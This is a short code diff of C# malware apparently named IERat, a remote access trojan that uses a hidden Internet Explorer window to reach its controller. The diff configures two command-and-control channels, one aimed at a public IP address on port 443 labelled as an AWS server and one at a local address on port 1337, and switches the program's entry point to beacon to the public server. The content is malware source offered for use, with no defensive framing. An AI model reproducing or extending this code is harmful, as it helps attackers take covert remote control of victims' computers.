@@ -4,17 +4,23 @@ namespace IERat
 {
     class IERat
     {
-        public static Channel channel = new Channel {
+        public static Channel AWSChannel = new Channel {
+            BaseURL = "http://3.68.73.27:443",
+            SleepTime = 3000,
+            IEvisible = false
+        };
+
+        public static Channel LocalChannel = new Channel
+        {
             BaseURL = "http://192.168.135.1:1337",
-            //BaseURL = "http://3.68.73.27:443",
             SleepTime = 3000,
             IEvisible = false
         };
 
         static void Main()
         {
-            channel.Open();
-            channel.agent.ExecuteTasks();
+            AWSChannel.Open();
+            //LocalChannel.Open();
         }
     }
 }
